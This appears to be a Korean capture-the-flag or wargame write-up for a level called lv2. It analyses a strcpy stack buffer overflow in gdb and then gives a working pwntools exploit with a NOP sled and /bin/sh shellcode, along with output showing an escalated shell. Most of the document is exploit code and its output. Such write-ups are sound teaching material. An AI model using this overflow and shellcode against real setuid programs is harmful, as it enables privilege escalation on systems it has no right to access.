# Lv1 -> Lv2
## lv2
gdb를 이용해 lv2 바이너리를 분석해 보면 다음과 같다.


* main
```asm
   0x08048430 <+0>:	push   ebp
   0x08048431 <+1>:	mov    ebp,esp
   0x08048433 <+3>:	sub    esp,0x10				; buf : 0x10 bytes
   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1		; [ebp + 8] : argc 
   0x0804843a <+10>:	jg     0x8048453 <main+35>			; 1보다 크면 main+35로 jmp
```


* main+35
```asm
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]		; eax에 argv[0] 주소 mov
   0x08048456 <+38>:	add    eax,0x4				; eax에 argv[1] 주소 mov
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]		; edx에 eax값 mov
   0x0804845b <+43>:	push   edx				; edx값을 스택에 push
   0x0804845c <+44>:	lea    eax,[ebp-0x10]			; eax에 변수 주소 복사
   0x0804845f <+47>:	push   eax				; eax값을 스택에 push
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>		; strcpy(str, argv[1]);
```

buf[0x10] + sfp(4) + ret(4) + shellcode
즉 argv[1]의 끝부분에 NOP을 포함한 쉘코드를 넣어두고, ret을 argv[1] NOP 부분으로 지정해주면 된다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argv = 'a' * 16 + 'b' * 4 + p32(0xffffd3a5) + '\x90' * 500 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' 

p = process(['./lv2', argv])
p.sendline('id')
p.recv()
p.sendline('my-pass')
p.recv()
p.interactive()

```
------

```
lv1@ubuntu:~$ python exploit.py 
[+] Starting local process './lv2' argv=['./lv2', 'aaaaaaaaaaaaaaaabbbb\xa5\xd3\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'] : pid 14847
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x263 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  62 62 62 62  a5 d3 ff ff  90 90 90 90  90 90 90 90  │bbbb│····│····│····│
    00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000200  90 90 90 90  90 90 90 90  90 90 90 90  31 c0 b0 31  │····│····│····│1··1│
    00000210  cd 80 89 c3  89 c1 31 c0  b0 46 cd 80  31 c0 50 68  │····│··1·│·F··│1·Ph│
    00000220  2f 2f 73 68  68 2f 62 69  6e 89 e3 50  53 89 e1 89  │//sh│h/bi│n··P│S···│
    00000230  c2 b0 0b cd  80 0a 75 69  64 3d 31 30  30 32 28 6c  │····│··ui│d=10│02(l│
    00000240  76 32 29 20  67 69 64 3d  31 30 30 31  28 6c 76 31  │v2) │gid=│1001│(lv1│
    00000250  29 20 67 72  6f 75 70 73  3d 31 30 30  31 28 6c 76  │) gr│oups│=100│1(lv│
    00000260  31 29 0a                                            │1)·│
    00000263
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[DEBUG] Received 0xa bytes:
    'tooo easy\n'
[*] Switching to interactive mode
$ 
```